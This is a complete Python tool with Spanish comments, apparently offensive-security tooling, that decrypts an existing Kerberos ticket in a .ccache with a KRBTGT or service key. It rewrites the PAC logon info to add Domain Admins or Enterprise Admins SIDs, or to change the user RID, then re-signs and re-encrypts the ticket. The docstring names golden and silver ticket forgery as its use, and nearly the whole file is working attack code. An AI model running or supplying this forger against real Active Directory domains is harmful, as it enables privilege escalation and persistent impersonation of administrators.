#!/usr/bin/python3
"""
edit_ticket.py  --  modifica un ticket Kerberos EXISTENTE in situ

Herramienta AUTONOMA (solo necesita pycryptodome). Abre un .ccache, lo
descifra con su clave, cambia SOLO los campos que indiques en el PAC_LOGON_INFO
y conserva todo lo demas byte a byte (tiempos, flags, clave de sesion, sname,
cname, crealm y los demas buffers del PAC). Recalcula las dos firmas del PAC,
re-cifra con la MISMA clave y etype, y reescribe el .ccache.

(KRBTGT para un golden, o la de servicio para un silver).

  # añadir Domain Admins y un extra-SID, conservando el resto
  python3 edit_ticket.py admin.ccache -k <key> \\
      --add-groups 512 --add-extra-sids S-1-5-21-10-20-30-519

  # cambiar el RID del usuario dejando intactos tiempos/flags/clave de sesion
  python3 edit_ticket.py admin.ccache -k <key> --user-id 500 -o editado.ccache

Verificacion (round-trip):
  python3 view_ticket.py editado.ccache -k <misma_key>
"""

import argparse
import binascii
import os
import struct
import sys

try:
    from Crypto.Cipher import ARC4, AES
    from Crypto.Hash import HMAC, MD5, SHA1
except ImportError:
    try:
        from Cryptodome.Cipher import ARC4, AES
        from Cryptodome.Hash import HMAC, MD5, SHA1
    except ImportError:
        sys.exit("[!] Falta pycryptodome. Instala con: pip install pycryptodome")

KEY_USAGE_ENC_TICKET_PART = 2
KEY_USAGE_PAC_CHECKSUM = 17            # KERB-NON-KERB-CKSUM-SALT
REF = 0x00020000                       # referente NDR no-nulo (el valor da igual)
NEVER = 0x7FFFFFFFFFFFFFFF
ETYPE_KEYLEN = {17: 16, 18: 32, 23: 16}
CKSUM_FOR_ETYPE = {18: (16, 12), 17: (15, 12), 23: (0xFFFFFF76, 16)}


# ==========================================================================
# ==========================================================================
def hmac_md5(key, data):
    return HMAC.new(key, data, MD5).digest()


def _nfold(data, nbytes):
    inbits = len(data) * 8
    outbits = nbytes * 8
    a, b = inbits, outbits
    while b:
        a, b = b, a % b
    reps = (inbits * outbits // a) // inbits
    buf = bytearray()
    for n in range(reps):
        rot = n * 13
        shifted = bytearray(len(data))
        for i in range(len(data)):
            src = (i * 8 - rot) % inbits
            byte = src // 8; bit = src % 8
            shifted[i] = ((data[byte] << bit) |
                          (data[(byte + 1) % len(data)] >> (8 - bit))) & 0xFF
        buf += shifted
    out = bytearray(nbytes); carry = 0
    for pos in range(nbytes - 1, -1, -1):
        s = carry; idx = pos
        while idx < len(buf):
            s += buf[idx]; idx += nbytes
        out[pos] = s & 0xFF; carry = s >> 8
    i = nbytes - 1
    while carry and i >= 0:
        s = out[i] + carry; out[i] = s & 0xFF; carry = s >> 8; i -= 1
    return bytes(out)


def _aes_dr(key, constant):
    ki = _nfold(constant, 16)
    out = b""; prev = ki
    ecb = AES.new(key, AES.MODE_ECB)
    while len(out) < len(key):
        prev = ecb.encrypt(prev); out += prev
    return out[:len(key)]


def _aes_dk(key, usage, kind):
    return _aes_dr(key, struct.pack("!I", usage) + bytes([kind]))


def rc4_hmac_decrypt(key, usage, ct):
    if usage in (3, 9):
        usage = 8
    k1 = hmac_md5(key, struct.pack("<I", usage))
    checksum = ct[:16]
    k3 = hmac_md5(k1, checksum)
    dec = ARC4.new(k3).decrypt(ct[16:])
    if hmac_md5(k1, dec) != checksum:
        raise ValueError("checksum RC4 no coincide (¿key incorrecta?)")
    return dec[8:]


def _aes_cts_decrypt(key, ct):
    bs = 16
    ecb = AES.new(key, AES.MODE_ECB)
    xor = lambda a, b: bytes(x ^ y for x, y in zip(a, b))
    n = len(ct)
    if n < bs:
        raise ValueError("ciphertext demasiado corto")
    if n == bs:
        return ecb.decrypt(ct)
    nblocks = (n + bs - 1) // bs
    rem = n - (nblocks - 1) * bs
    blocks = [ct[i * bs:(i + 1) * bs] for i in range(nblocks - 2)]
    cn_1 = ct[(nblocks - 2) * bs:(nblocks - 1) * bs]
    cn = ct[(nblocks - 1) * bs:]
    prev = bytes(bs); plain = b""
    for blk in blocks:
        plain += xor(ecb.decrypt(blk), prev); prev = blk
    dn = ecb.decrypt(cn_1)
    c = cn + dn[rem:]
    pn = xor(dn[:rem], cn)
    pn_1 = xor(ecb.decrypt(c), prev)
    return plain + pn_1 + pn


def aes_decrypt(key, usage, ct):
    ke = _aes_dk(key, usage, 0xAA)
    ki = _aes_dk(key, usage, 0x55)
    enc, mac = ct[:-12], ct[-12:]
    plain = _aes_cts_decrypt(ke, enc)
    if HMAC.new(ki, plain, SHA1).digest()[:12] != mac:
        raise ValueError("HMAC AES no coincide (¿key incorrecta?)")
    return plain[16:]


def decrypt_enc_part(etype, key, cipher):
    if etype == 23:
        return rc4_hmac_decrypt(key, KEY_USAGE_ENC_TICKET_PART, cipher)
    if etype in (17, 18):
        return aes_decrypt(key, KEY_USAGE_ENC_TICKET_PART, cipher)
    raise ValueError("etype %d no soportado (23, 17, 18)" % etype)


def rc4_hmac_encrypt(key, usage, data):
    if usage in (3, 9):
        usage = 8
    k1 = hmac_md5(key, struct.pack("<I", usage))
    plain = os.urandom(8) + data
    checksum = hmac_md5(k1, plain)
    k3 = hmac_md5(k1, checksum)
    return checksum + ARC4.new(k3).encrypt(plain)


def _aes_cts_encrypt(key, pt):

    bs = 16
    ecb = AES.new(key, AES.MODE_ECB)
    xor = lambda a, b: bytes(x ^ y for x, y in zip(a, b))
    n = len(pt)
    if n < bs:
        raise ValueError("plaintext demasiado corto")
    if n == bs:
        return ecb.encrypt(pt)
    nblocks = (n + bs - 1) // bs
    rem = n - (nblocks - 1) * bs
    prev = bytes(bs); out = b""
    for i in range(nblocks - 2):
        c = ecb.encrypt(xor(pt[i * bs:(i + 1) * bs], prev))
        out += c; prev = c
    pn_1 = pt[(nblocks - 2) * bs:(nblocks - 1) * bs]
    pn = pt[(nblocks - 1) * bs:]
    c = ecb.encrypt(xor(pn_1, prev))
    cn = c[:rem]
    cn_1 = ecb.encrypt(xor(c[:rem], pn) + c[rem:])
    return out + cn_1 + cn


def aes_encrypt(key, usage, data):
    ke = _aes_dk(key, usage, 0xAA)
    ki = _aes_dk(key, usage, 0x55)
    plain = os.urandom(16) + data
    enc = _aes_cts_encrypt(ke, plain)
    mac = HMAC.new(ki, plain, SHA1).digest()[:12]
    return enc + mac


def encrypt_enc_part(etype, key, plain):
    if etype == 23:
        return rc4_hmac_encrypt(key, KEY_USAGE_ENC_TICKET_PART, plain)
    if etype in (17, 18):
        return aes_encrypt(key, KEY_USAGE_ENC_TICKET_PART, plain)
    raise ValueError("etype %d no soportado (23, 17, 18)" % etype)


def cksum_aes(key, usage, data):
    kc = _aes_dk(key, usage, 0x99)
    return HMAC.new(kc, data, SHA1).digest()[:12]


def cksum_rc4(key, usage, data):
    ksign = hmac_md5(key, b"signaturekey\x00")
    tmp = MD5.new(struct.pack("<I", usage) + data).digest()
    return hmac_md5(ksign, tmp)


def pac_checksum(etype, key, data):
    if etype == 23:
        return cksum_rc4(key, KEY_USAGE_PAC_CHECKSUM, data)
    return cksum_aes(key, KEY_USAGE_PAC_CHECKSUM, data)


# ==========================================================================
# ==========================================================================
class Reader:
    def __init__(self, data):
        self.d = data; self.i = 0

    def u8(self):  v = self.d[self.i]; self.i += 1; return v
    def u16(self): v = struct.unpack_from("!H", self.d, self.i)[0]; self.i += 2; return v
    def u32(self): v = struct.unpack_from("!I", self.d, self.i)[0]; self.i += 4; return v
    def raw(self, n): v = self.d[self.i:self.i + n]; self.i += n; return v
    def cstr(self): return self.raw(self.u32())
    def eof(self): return self.i >= len(self.d)


def parse_principal(r, version):
    name_type = r.u32()
    count = r.u32()
    if version == 0x0501:
        count -= 1
    realm = r.cstr().decode("utf-8", "replace")
    comps = [r.cstr().decode("utf-8", "replace") for _ in range(count)]
    return {"name_type": name_type, "realm": realm, "components": comps,
            "str": "/".join(comps) + "@" + realm}


def parse_ccache(data):
    r = Reader(data)
    version = r.u16()
    if version in (0x0504,):
        hlen = r.u16(); r.raw(hlen)
    default = parse_principal(r, version)
    creds = []
    while not r.eof():
        client = parse_principal(r, version)
        server = parse_principal(r, version)
        keytype = r.u16(); r.u16(); keylen = r.u16(); keyvalue = r.raw(keylen)
        authtime = r.u32(); starttime = r.u32()
        endtime = r.u32(); renew_till = r.u32()
        r.u8()                                 # is_skey
        tktflags = r.u32()
        for _ in range(r.u32()):               # addresses
            r.u16(); r.cstr()
        for _ in range(r.u32()):               # authdata
            r.u16(); r.cstr()
        ticket = r.cstr(); r.cstr()            # ticket, second
        creds.append({
            "client": client, "server": server,
            "keytype": keytype, "keyvalue": keyvalue,
            "authtime": authtime, "starttime": starttime,
            "endtime": endtime, "renew_till": renew_till,
            "tktflags": tktflags, "ticket": ticket,
        })
    return {"version": version, "default": default, "creds": creds}


class Writer:
    def __init__(self): self.b = bytearray()
    def u8(self, v):  self.b.append(v & 0xFF)
    def u16(self, v): self.b += struct.pack("!H", v)
    def u32(self, v): self.b += struct.pack("!I", v)
    def raw(self, d): self.b += d
    def cstr(self, d): self.u32(len(d)); self.raw(d)


def write_principal(w, name_type, realm, comps):
    w.u32(name_type); w.u32(len(comps))
    w.cstr(realm.encode("utf-8"))
    for c in comps:
        w.cstr(c.encode("utf-8"))


def build_ccache(default, creds):
    w = Writer()
    w.u16(0x0504)
    hdr = struct.pack("!HH", 1, 8) + b"\x00" * 8     # DeltaTime
    w.u16(len(hdr)); w.raw(hdr)
    write_principal(w, *default)
    for cred in creds:
        write_principal(w, *cred["client"])
        write_principal(w, *cred["server"])
        w.u16(cred["keytype"]); w.u16(0)
        w.u16(len(cred["keyvalue"])); w.raw(cred["keyvalue"])
        w.u32(cred["authtime"]); w.u32(cred["starttime"])
        w.u32(cred["endtime"]); w.u32(cred["renew_till"])
        w.u8(0); w.u32(cred["tktflags"])
        w.u32(0); w.u32(0)                           # addresses, authdata
        w.cstr(cred["ticket"]); w.cstr(b"")
    return bytes(w.b)


# ==========================================================================
# ==========================================================================
def der_len(d, i):
    first = d[i]; i += 1
    if first < 0x80:
        return first, i
    nby = first & 0x7F
    return int.from_bytes(d[i:i + nby], "big"), i + nby


def der_parse(d, i=0):
    tag = d[i]; i += 1
    length, i = der_len(d, i)
    return tag, d[i:i + length], i + length


def der_children(content):
    out, i = [], 0
    while i < len(content):
        tag, c, i = der_parse(content, i)
        out.append((tag, c))
    return out


def der_int(content): return int.from_bytes(content, "big")
def der_str(content): return content.decode("utf-8", "replace")


def unwrap_context(tag, content):
    inner_tag, inner_c, _ = der_parse(content, 0)
    return inner_tag, inner_c


def der_enc_len(n):
    if n < 0x80:
        return bytes([n])
    out = bytearray()
    while n:
        out.insert(0, n & 0xFF); n >>= 8
    return bytes([0x80 | len(out)]) + bytes(out)


def tlv(tag, content): return bytes([tag]) + der_enc_len(len(content)) + content


def d_int(v):
    if v == 0:
        body = b"\x00"
    else:
        body = v.to_bytes((v.bit_length() + 7) // 8, "big")
        if body[0] & 0x80:
            body = b"\x00" + body
    return tlv(0x02, body)


def d_gstr(s): return tlv(0x1B, s.encode("utf-8"))
def d_oct(b):  return tlv(0x04, b)
def d_seq(c):  return tlv(0x30, c)
def d_ctx(n, inner): return tlv(0xA0 | n, inner)
def d_time_str(s):   return tlv(0x18, s.encode("ascii"))


def d_principalname(name_type, comps):
    namestr = d_seq(b"".join(d_gstr(c) for c in comps))
    return d_seq(d_ctx(0, d_int(name_type)) + d_ctx(1, namestr))


def d_ad_element(ad_type, ad_data):
    return d_seq(d_ctx(0, d_int(ad_type)) + d_ctx(1, d_oct(ad_data)))


# ==========================================================================
# ==========================================================================
def parse_principal_name(seq_content):
    fields = {c[0]: c[1] for c in der_children(seq_content)}
    comps = []
    if 0xA1 in fields:
        _, names, _ = der_parse(fields[0xA1], 0)
        for tag, c in der_children(names):
            comps.append(der_str(c))
    return "/".join(comps)


def parse_ticket(der):
    _, app, _ = der_parse(der, 0)
    _, inner_c, _ = der_parse(app, 0)
    fields = {c[0]: c[1] for c in der_children(inner_c)}
    out = {}
    out["tkt_vno"] = der_int(unwrap_context(0xA0, fields[0xA0])[1])
    out["realm"] = der_str(unwrap_context(0xA1, fields[0xA1])[1])
    _, sname_seq = unwrap_context(0xA2, fields[0xA2])
    out["sname"] = parse_principal_name(sname_seq)
    _, enc = unwrap_context(0xA3, fields[0xA3])
    ef = {c[0]: c[1] for c in der_children(enc)}
    out["etype"] = der_int(unwrap_context(0xA0, ef[0xA0])[1])
    out["kvno"] = der_int(unwrap_context(0xA1, ef[0xA1])[1]) if 0xA1 in ef else None
    out["cipher"] = unwrap_context(0xA2, ef[0xA2])[1]
    return out


def parse_enc_ticket_part(der):
    _, inner_c, _ = der_parse(der, 0)
    _, seq_c, _ = der_parse(inner_c, 0)
    fields = {c[0]: c[1] for c in der_children(seq_c)}
    out = {}
    if 0xA0 in fields:
        _, bs, _ = der_parse(fields[0xA0], 0)
        out["flags"] = bs
    if 0xA1 in fields:
        _, keyseq, _ = der_parse(fields[0xA1], 0)
        kf = {c[0]: c[1] for c in der_children(keyseq)}
        out["key_etype"] = der_int(unwrap_context(0xA0, kf[0xA0])[1])
        out["key_value"] = unwrap_context(0xA1, kf[0xA1])[1]
    if 0xA2 in fields:
        out["crealm"] = der_str(unwrap_context(0xA2, fields[0xA2])[1])
    if 0xA3 in fields:
        _, cn, _ = der_parse(fields[0xA3], 0)
        out["cname"] = parse_principal_name(cn)
    for tag, name in [(0xA5, "authtime"), (0xA6, "starttime"),
                      (0xA7, "endtime"), (0xA8, "renew_till")]:
        if tag in fields:
            out[name] = der_str(unwrap_context(tag, fields[tag])[1])
    if 0xAA in fields:
        out["authdata"] = fields[0xAA]
    return out


def find_pac(ad_der):
    _, authdata, _ = der_parse(ad_der, 0)
    for tag, entry in der_children(authdata):
        ef = {c[0]: c[1] for c in der_children(entry)}
        ad_type = der_int(unwrap_context(0xA0, ef[0xA0])[1])
        ad_data = unwrap_context(0xA1, ef[0xA1])[1]
        if ad_type == 1:
            r = find_pac(ad_data)
            if r:
                return r
        elif ad_type == 128:
            return ad_data
    return None


# ==========================================================================
# ==========================================================================
class NDR:
    def __init__(self, data): self.d = data; self.p = 0
    def align(self, n):
        rem = self.p % n
        if rem: self.p += n - rem
    def u8(self):  v = self.d[self.p]; self.p += 1; return v
    def u16(self): self.align(2); v = struct.unpack_from("<H", self.d, self.p)[0]; self.p += 2; return v
    def u32(self): self.align(4); v = struct.unpack_from("<I", self.d, self.p)[0]; self.p += 4; return v
    def raw(self, n): v = self.d[self.p:self.p + n]; self.p += n; return v
    def ustr_header(self):
        length = self.u16(); self.u16(); ref = self.u32()
        return {"len": length, "ref": ref}
    def ustr_buffer(self):
        self.u32(); self.u32(); actual = self.u32()
        return self.raw(actual * 2).decode("utf-16-le", "replace")
    def sid(self):
        self.u32(); rev = self.u8(); sub_count = self.u8()
        authority = int.from_bytes(self.raw(6), "big")
        subs = [self.u32() for _ in range(sub_count)]
        return "S-%d-%d-%s" % (rev, authority, "-".join(str(s) for s in subs))


def decode_logon_info(buf):
    r = NDR(buf)
    r.raw(8); r.raw(8); r.u32()
    def ft(): return struct.unpack_from("<Q", r.raw(8), 0)[0]
    logon_time = ft(); ft(); ft(); ft(); ft(); ft()
    eff_name = r.ustr_header(); full_name = r.ustr_header()
    r.ustr_header(); r.ustr_header(); r.ustr_header(); r.ustr_header()
    r.u16(); r.u16()
    user_id = r.u32(); primary_gid = r.u32()
    group_count = r.u32(); group_ids_ref = r.u32()
    r.u32()                                    # user_flags
    r.raw(16)                                  # UserSessionKey
    logon_server = r.ustr_header(); logon_domain = r.ustr_header()
    domain_sid_ref = r.u32()
    r.raw(8); uac = r.u32(); r.u32()
    ft(); ft(); r.u32(); r.u32()
    sid_count = r.u32(); extra_sids_ref = r.u32()
    res_group_dom_ref = r.u32(); res_group_count = r.u32(); res_group_ids_ref = r.u32()

    out = {"user_id": user_id, "primary_gid": primary_gid, "uac": uac,
           "logon_time": logon_time, "groups": [], "extra_sids": []}
    for hdr in (eff_name, full_name):
        if hdr["ref"]:
            s = r.ustr_buffer()
            out["account" if hdr is eff_name else "full_name"] = s
    if group_ids_ref:
        r.u32()
        for _ in range(group_count):
            rid = r.u32(); attr = r.u32(); out["groups"].append((rid, attr))
    for hdr in (logon_server, logon_domain):
        if hdr["ref"]:
            s = r.ustr_buffer()
            out["domain" if hdr is logon_domain else "logon_server"] = s
    if domain_sid_ref:
        out["domain_sid"] = r.sid()
    if extra_sids_ref:
        r.u32()
        entries = [(r.u32(), r.u32()) for _ in range(sid_count)]
        for ref, attr in entries:
            if ref:
                out["extra_sids"].append((r.sid(), attr))
    if res_group_dom_ref:
        r.sid()
    if res_group_ids_ref:
        r.u32()
        for _ in range(res_group_count):
            r.u32(); r.u32()
    return out


class NDRW:
    def __init__(self): self.b = bytearray()
    def align(self, n):
        while len(self.b) % n: self.b.append(0)
    def u8(self, v):  self.b.append(v & 0xFF)
    def u16(self, v): self.align(2); self.b += struct.pack("<H", v)
    def u32(self, v): self.align(4); self.b += struct.pack("<I", v)
    def raw(self, d): self.b += d
    def ft(self, v):  self.b += struct.pack("<Q", v)
    def ustr_header(self, s, ref):
        blen = len(s.encode("utf-16-le")) if s else 0
        self.u16(blen); self.u16(blen); self.u32(ref if s else 0)
    def ustr_buffer(self, s):
        chars = len(s)
        self.u32(chars); self.u32(0); self.u32(chars)
        self.raw(s.encode("utf-16-le"))
    def sid(self, sid_str):
        p = sid_str.split("-")
        rev = int(p[1]); auth = int(p[2]); subs = [int(x) for x in p[3:]]
        self.u32(len(subs)); self.u8(rev); self.u8(len(subs))
        self.raw(auth.to_bytes(6, "big"))
        for s in subs:
            self.u32(s)


def build_logon_info(p, logon_ft):
    """Reconstruye KERB_VALIDATION_INFO en NDR, preservando el timestamp."""
    groups = p["groups"]; extra = p["extra_sids"]
    body = NDRW()
    body.u32(REF)
    body.ft(logon_ft)                          # logon_time (preservado)
    body.ft(NEVER); body.ft(NEVER)             # logoff, kickoff
    body.ft(logon_ft); body.ft(0); body.ft(NEVER)   # pwd_last_set, can, must
    body.ustr_header(p["account"], REF)        # eff_name
    body.ustr_header(p["account"], REF)        # full_name
    body.ustr_header("", 0); body.ustr_header("", 0)
    body.ustr_header("", 0); body.ustr_header("", 0)
    body.u16(0); body.u16(0)                   # logon_count, bad_pwd_count
    body.u32(p["user_id"]); body.u32(p["primary_gid"])
    body.u32(len(groups)); body.u32(REF if groups else 0)
    body.u32(0x00000220)                       # user_flags
    body.raw(b"\x00" * 16)                     # UserSessionKey
    body.ustr_header(p["netbios"], REF)        # logon_server
    body.ustr_header(p["netbios"], REF)        # logon_domain
    body.u32(REF)                              # domain_sid_ref
    body.raw(b"\x00" * 8)                      # Reserved1
    body.u32(p["uac"]); body.u32(0)            # uac, sub_auth_status
    body.ft(logon_ft); body.ft(0)             # last_ok, last_fail
    body.u32(0); body.u32(0)                   # failed_logon_count, Reserved3
    body.u32(len(extra)); body.u32(REF if extra else 0)
    body.u32(0); body.u32(0); body.u32(0)      # resource groups (ninguno)
    # diferido
    body.ustr_buffer(p["account"]); body.ustr_buffer(p["account"])
    if groups:
        body.u32(len(groups))
        for rid in groups:
            body.u32(rid); body.u32(0x00000007)
    body.ustr_buffer(p["netbios"]); body.ustr_buffer(p["netbios"])
    body.sid(p["sid"])
    if extra:
        body.u32(len(extra))
        for _ in extra:
            body.u32(REF); body.u32(0x00000007)
        for s in extra:
            body.sid(s)
    body_bytes = bytes(body.b)
    common = b"\x01\x10\x08\x00\xcc\xcc\xcc\xcc"
    private = struct.pack("<I", len(body_bytes)) + b"\x00\x00\x00\x00"
    return common + private + body_bytes


def build_ticket(realm, sname_type, sname_comps, etype, kvno, cipher):
    encdata = d_seq(d_ctx(0, d_int(etype)) +
                    (d_ctx(1, d_int(kvno)) if kvno is not None else b"") +
                    d_ctx(2, d_oct(cipher)))
    seq = (d_ctx(0, d_int(5)) + d_ctx(1, d_gstr(realm)) +
           d_ctx(2, d_principalname(sname_type, sname_comps)) +
           d_ctx(3, encdata))
    return tlv(0x61, d_seq(seq))


# ==========================================================================
# ==========================================================================
def parse_pac_buffers(pac):
    cbuffers = struct.unpack_from("<I", pac, 0)[0]
    out, off = [], 8
    for _ in range(cbuffers):
        ultype, size, offset = struct.unpack_from("<IIQ", pac, off)
        off += 16
        out.append([ultype, pac[offset:offset + size]])
    return out


def assemble_pac(buffers, etype, key):

    sigtype, siglen = CKSUM_FOR_ETYPE[etype]
    norm = []
    for ultype, data in buffers:
        if ultype in (6, 7):
            data = struct.pack("<I", sigtype) + b"\x00" * siglen
        norm.append((ultype, data))
    header_size = 8 + 16 * len(norm)
    head = bytearray(struct.pack("<II", len(norm), 0))
    blob = bytearray(); positions = {}; off = header_size
    for ultype, data in norm:
        head += struct.pack("<IIQ", ultype, len(data), off)
        positions[ultype] = off
        blob += data
        pad = (-len(data)) % 8
        blob += b"\x00" * pad
        off += len(data) + pad
    pac = bytearray(head + blob)
    srv = pac_checksum(etype, key, bytes(pac))
    pac[positions[6] + 4:positions[6] + 4 + siglen] = srv
    kdc = pac_checksum(etype, key, srv)
    pac[positions[7] + 4:positions[7] + 4 + siglen] = kdc
    return bytes(pac)


def rebuild_enc_ticket_part(etp, new_pac):
    """Reconstruye el EncTicketPart preservando todos los campos originales,
    sustituyendo unicamente la authorization-data (el PAC)."""
    authdata = d_seq(d_ad_element(1, d_seq(d_ad_element(128, new_pac))))
    key = d_seq(d_ctx(0, d_int(etp["key_etype"])) +
                d_ctx(1, d_oct(etp["key_value"])))
    transited = d_seq(d_ctx(0, d_int(0)) + d_ctx(1, d_oct(b"")))
    cname_comps = etp["cname"].split("/") if etp.get("cname") else []
    parts = (d_ctx(0, tlv(0x03, etp["flags"])) +       # flags originales
             d_ctx(1, key) +                           # clave de sesion
             d_ctx(2, d_gstr(etp["crealm"])) +
             d_ctx(3, d_principalname(1, cname_comps)) +
             d_ctx(4, transited))
    for tag, name in [(5, "authtime"), (6, "starttime"),
                      (7, "endtime"), (8, "renew_till")]:
        if name in etp:
            parts += d_ctx(tag, d_time_str(etp[name]))  # tiempos originales
    parts += d_ctx(10, authdata)
    return tlv(0x63, d_seq(parts))


def cred_to_fmt(c, new_ticket=None):
    return {
        "client": (c["client"]["name_type"], c["client"]["realm"],
                   c["client"]["components"]),
        "server": (c["server"]["name_type"], c["server"]["realm"],
                   c["server"]["components"]),
        "keytype": c["keytype"], "keyvalue": c["keyvalue"],
        "authtime": c["authtime"], "starttime": c["starttime"],
        "endtime": c["endtime"], "renew_till": c["renew_till"],
        "tktflags": c["tktflags"],
        "ticket": new_ticket if new_ticket is not None else c["ticket"],
    }


def main():
    ap = argparse.ArgumentParser(
        description="Edita un ticket Kerberos EXISTENTE conservando el resto")
    ap.add_argument("ccache", help="fichero .ccache a modificar")
    ap.add_argument("-k", "--key", required=True,
                    help="la MISMA clave que abre el ticket (hex)")
    ap.add_argument("-o", "--out", help="salida (def.: sobrescribe la entrada)")
    ap.add_argument("--cred", type=int, default=0, help="indice de credencial")
    ap.add_argument("--account", help="cambia el nombre de cuenta")
    ap.add_argument("--user-id", type=int, help="cambia el RID del usuario")
    ap.add_argument("--primary-gid", type=int, help="cambia el RID primario")
    ap.add_argument("--groups", help="REEMPLAZA la lista de grupos (RIDs csv)")
    ap.add_argument("--add-groups", help="AÑADE RIDs de grupo (csv)")
    ap.add_argument("--extra-sids", help="REEMPLAZA los extra-SIDs (csv)")
    ap.add_argument("--add-extra-sids", help="AÑADE extra-SIDs (csv)")
    ap.add_argument("--uac", help="cambia el UAC (hex, p.ej. 0x210)")
    args = ap.parse_args()

    key = binascii.unhexlify(args.key)

    with open(args.ccache, "rb") as f:
        cc = parse_ccache(f.read())
    if args.cred >= len(cc["creds"]):
        sys.exit("[!] la credencial %d no existe" % args.cred)
    cred = cc["creds"][args.cred]

    tkt = parse_ticket(cred["ticket"])
    etype = tkt["etype"]
    try:
        plain = decrypt_enc_part(etype, key, tkt["cipher"])
    except Exception as e:
        sys.exit("[!] no pude descifrar (¿clave incorrecta?): %s" % e)
    etp = parse_enc_ticket_part(plain)

    if "authdata" not in etp:
        sys.exit("[!] el ticket no lleva authorization-data / PAC")
    pac = find_pac(etp["authdata"])
    if not pac:
        sys.exit("[!] no hay PAC en el ticket")

    buffers = parse_pac_buffers(pac)
    logon_idx = next((i for i, b in enumerate(buffers) if b[0] == 1), None)
    if logon_idx is None:
        sys.exit("[!] el PAC no tiene LOGON_INFO (tipo 1)")
    li = decode_logon_info(buffers[logon_idx][1])

    p = {
        "account": li.get("account", ""), "netbios": li.get("domain", ""),
        "sid": li.get("domain_sid", ""), "user_id": li["user_id"],
        "primary_gid": li["primary_gid"], "uac": li["uac"],
        "groups": [rid for rid, _ in li["groups"]],
        "extra_sids": [sid for sid, _ in li["extra_sids"]],
    }

    changes = []
    if args.account:
        p["account"] = args.account; changes.append("account=%s" % args.account)
    if args.user_id is not None:
        p["user_id"] = args.user_id; changes.append("user_id=%d" % args.user_id)
    if args.primary_gid is not None:
        p["primary_gid"] = args.primary_gid
        changes.append("primary_gid=%d" % args.primary_gid)
    if args.groups is not None:
        p["groups"] = [int(x) for x in args.groups.split(",") if x]
        changes.append("groups=%s" % p["groups"])
    if args.add_groups:
        add = [int(x) for x in args.add_groups.split(",") if x]
        p["groups"] += [g for g in add if g not in p["groups"]]
        changes.append("+groups=%s" % add)
    if args.extra_sids is not None:
        p["extra_sids"] = [s for s in args.extra_sids.split(",") if s]
        changes.append("extra_sids=%s" % p["extra_sids"])
    if args.add_extra_sids:
        add = [s for s in args.add_extra_sids.split(",") if s]
        p["extra_sids"] += [s for s in add if s not in p["extra_sids"]]
        changes.append("+extra_sids=%s" % add)
    if args.uac:
        p["uac"] = int(args.uac, 16); changes.append("uac=0x%x" % p["uac"])

    if not changes:
        sys.exit("[!] no indicaste ningun cambio (--add-groups, --user-id, ...)")

    buffers[logon_idx][1] = build_logon_info(p, li["logon_time"])
    new_pac = assemble_pac(buffers, etype, key)
    new_etp = rebuild_enc_ticket_part(etp, new_pac)
    new_cipher = encrypt_enc_part(etype, key, new_etp)

    srv = cred["server"]
    new_ticket = build_ticket(tkt["realm"], srv["name_type"],
                              srv["components"], etype, tkt["kvno"], new_cipher)

    default = (cc["default"]["name_type"], cc["default"]["realm"],
               cc["default"]["components"])
    creds = [cred_to_fmt(c, new_ticket if i == args.cred else None)
             for i, c in enumerate(cc["creds"])]
    data = build_ccache(default, creds)

    out = args.out or args.ccache
    with open(out, "wb") as f:
        f.write(data)

    print("[+] Ticket editado in situ -> %s" % out)
    print("    cambios: %s" % "; ".join(changes))
    print("    conservado: tiempos, flags, clave de sesion, sname=%s, cname=%s"
          % (tkt["sname"], etp.get("cname")))
    print("[i] Verifica con: python3 view_ticket.py %s -k %s" % (out, args.key))


if __name__ == "__main__":
    main()
